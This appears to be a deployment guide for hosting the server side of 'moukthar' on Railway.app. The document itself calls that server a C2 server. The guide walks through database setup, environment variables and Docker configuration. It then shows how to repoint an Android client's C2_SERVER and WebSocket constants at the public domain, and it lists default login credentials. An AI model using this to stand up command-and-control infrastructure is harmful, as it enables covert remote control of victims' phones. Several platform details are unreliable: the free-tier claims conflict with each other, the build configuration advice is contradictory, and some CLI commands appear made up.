# Railway.app Deployment Guide

## Overview

Railway makes deploying Docker applications extremely easy:
- Free tier: $5 credit/month
- Usually lasts 2-3 months free
- Always-on (no sleeping)
- One-click deployment
- Built-in MySQL database

**Cost: Free for 2-3 months, then $5-10/month**

---

## Prerequisites

- GitHub account (with moukthar repository)
- Railway account (free)
- Docker and docker-compose (optional, for local testing)

---

## Step 1: Create Railway Account

1. Go to [railway.app](https://railway.app)
2. Click **Sign Up**
3. Sign in with GitHub
4. Authorize Railway to access your GitHub account

---

## Step 2: Create New Project

1. Click **Create New Project**
2. Select **Deploy from GitHub repo**
3. Find and select your `moukthar` repository
4. Click **Deploy Now**

---

## Step 3: Add MySQL Database

1. In your Railway project, click **+ Add**
2. Select **Database** → **MySQL**
3. Railway automatically creates database with credentials
4. Note the database credentials shown

---

## Step 4: Configure Environment Variables

Railway needs to know how to run your server.

### In Railway Dashboard:

1. Click on the **GitHub repo service**
2. Go to **Variables** tab
3. Add these environment variables:

```
DB_HOST=mysql
DB_NAME=cc
DB_USER=[your mysql user]
DB_PASSWORD=[your mysql password]
WEBSOCKET_URI=ws://[your-railway-domain]:8080
```

To get your Railway domain:
1. Go to **Settings** tab
2. Look for **Domains** section
3. Your domain will be something like `moukthar-production.railway.app`

So the WEBSOCKET_URI would be:
```
WEBSOCKET_URI=ws://moukthar-production.railway.app:8080
```

---

## Step 5: Configure Dockerfile

Railway needs to know how to build and run your container.

Create/update `Server/.railway/Procfile`:

```
web: docker-compose up
```

Or update `Server/Dockerfile` to include this line at the end:

```dockerfile
EXPOSE 80
EXPOSE 8080
CMD ["docker-compose", "up"]
```

Actually, the better approach is to create a `Server/railway.json`:

```json
{
  "build": {
    "builder": "docker",
    "context": "Server"
  },
  "start": "docker-compose up"
}
```

---

## Step 6: Configure database.sql

Railway needs to initialize the database with your schema.

1. In Railway dashboard, click on **MySQL service**
2. Go to **Data** tab
3. Click **Console**
4. Copy-paste contents of `Server/database.sql`
5. Execute

Or use Railway CLI:

```bash
# Install Railway CLI
npm i -g @railway/cli

# Login
railway login

# Link project
railway link

# Execute SQL
railway exec mysql < Server/database.sql
```

---

## Step 7: Deploy

### Option A: Automatic Deployment (Recommended)

Railway automatically deploys when you push to GitHub:

```bash
# Push your changes
git add .
git commit -m "Deploy to Railway"
git push origin main
```

Watch deployment in Railway dashboard:
- Go to **Deployments** tab
- See build progress
- Once "Active", it's live!

### Option B: Manual Deployment via CLI

```bash
# Install Railway CLI
npm i -g @railway/cli

# Login
railway login

# Link to your project
railway link

# Deploy
railway up
```

---

## Step 8: Update Android Client

Update the client to point to your Railway domain:

**File:** `Client/app/src/main/java/com/ot/grhq/client/functionality/Utils.java`

Change:
```java
private static final String C2_SERVER = "http://localhost";
public static final String WEB_SOCKET_SERVER = "ws://localhost:8080";
```

To:
```java
private static final String C2_SERVER = "http://moukthar-production.railway.app";
public static final String WEB_SOCKET_SERVER = "ws://moukthar-production.railway.app:8080";
```

(Replace `moukthar-production` with your actual Railway domain)

---

## Step 9: Access Your C2 Server

Open browser:
```
http://moukthar-production.railway.app
```

Login:
- **Username:** android
- **Password:** android

---

## Monitoring

### View Logs

In Railway dashboard:
1. Click on your service
2. Go to **Logs** tab
3. See real-time logs

### View Metrics

In Railway dashboard:
1. Click **Metrics** tab
2. See CPU, memory, disk usage

### View Deployments

1. Click **Deployments** tab
2. See deployment history
3. Rollback if needed

---

## Managing Your Free Credit

### Check Credit Balance

1. Go to **Account Settings**
2. Look for **Billing** section
3. See remaining credit

### Reduce Usage

Railway charges based on:
- CPU usage
- Memory usage
- Disk storage
- Data transfer

To reduce costs:
- Close unused services
- Don't over-allocate RAM
- Minimize data transfers
- Use caching

### When Credit Runs Out

You have options:

**Option 1: Add Payment Method**
- Click **Billing**
- Add credit card
- Service continues (~$5-10/month)

**Option 2: Migrate to Oracle Cloud** (free)
- Follow [Oracle Cloud Setup](ORACLE_CLOUD_SETUP.md)

**Option 3: Migrate to Home Server** (free)
- Follow [Home Server Setup](HOME_SERVER_SETUP.md)

---

## Troubleshooting

### Deployment Failed

1. Check **Deployments** tab
2. Click failed deployment
3. Look at error message
4. Fix code and push again

Common issues:
- Dockerfile syntax error
- Missing environment variables
- Port configuration issues

### Service won't start

1. Check **Logs** tab
2. Look for error messages
3. Verify environment variables are set
4. Check database connection

### Can't access web service

1. Verify domain is correct
2. Check **Settings** → **Domains**
3. Restart service (click ... → Restart)
4. Wait 1-2 minutes for restart

### WebSocket connection fails

1. Verify WEBSOCKET_URI environment variable
2. Check logs for WebSocket errors
3. Verify port 8080 is exposed
4. Try accessing `http://domain:8080` directly

---

## Advanced Configuration

### Custom Domain

1. Go to **Settings**
2. Click **Add Custom Domain**
3. Point your domain's DNS to Railway
4. Railway provides instructions

### Environment Secrets

For sensitive data (passwords, API keys):

```bash
railway variables
# Set DATABASE_PASSWORD
railway variables set DATABASE_PASSWORD "your-secret"
```

### Scale Services

In Railway dashboard:
1. Click service
2. Go to **Settings**
3. Adjust CPU/Memory allocation
4. Save

---

## Cost Examples

**Typical Usage:**
- Base cost: $0 (always free tier)
- With high traffic: $5-15/month
- Estimator: railway.app/pricing

---

## When to Migrate

Consider moving to Oracle Cloud if:
- You're going over free tier limits
- You need more resources
- You want no cost forever
- You want full control

Follow [Oracle Cloud Setup](ORACLE_CLOUD_SETUP.md) to migrate.

---

## Database Management

### Access MySQL Database

Using Railway CLI:
```bash
railway shell mysql
```

Then connect to MySQL:
```bash
mysql -u android -p cc
```

### Backup Database

```bash
# Download backup
railway database export
```

### Restore Database

```bash
# Upload backup
railway database import < backup.sql
```

---

## Git Workflow

### Automatic Deployments

Every push to `main` automatically deploys:

```bash
# Make changes
git add .
git commit -m "Add feature"
git push origin main

# Watch deployment in Railway dashboard
```

### Rollback

1. Go to **Deployments** tab
2. Find previous working deployment
3. Click ... → **Rollback**

---

## Security

### Keep Secrets Safe

Never commit sensitive data:
```bash
# Add to .gitignore
echo ".env" >> .gitignore
git rm --cached .env
git commit -m "Remove .env"
```

Use Railway variables instead.

### Network Security

Railway handles:
- ✅ HTTPS/WSS encryption
- ✅ DDoS protection
- ✅ Security headers
- ✅ Firewalls

### Database Security

- Database only accessible from your services
- No public access by default
- Strong passwords required

---

## Free Tier Limits

Stay within limits:
- ✅ Compute: Up to 32 CPU cores shared
- ✅ Memory: Unlimited allocation
- ✅ Disk: 100GB per service
- ✅ Databases: PostgreSQL/MySQL included
- ✅ Bandwidth: First 100GB/month free, then paid

---

## Next Steps

1. ✅ Project created on Railway
2. ✅ Database configured
3. ✅ Deployed with docker-compose
4. ✅ Accessible at your domain
5. 🔄 Configure Android client
6. 🔄 Monitor usage and logs

---

## Support

- Railway Discord: [discord.gg/railway](https://discord.gg/railway)
- Documentation: [docs.railway.app](https://docs.railway.app)
- Pricing: [railway.app/pricing](https://railway.app/pricing)

---

**You're now deployed on Railway! Enjoy 2-3 free months!**

When credit runs out, either:
1. Add payment method ($5-10/month)
2. Migrate to Oracle Cloud (free forever)
3. Migrate to Home Server (free forever)
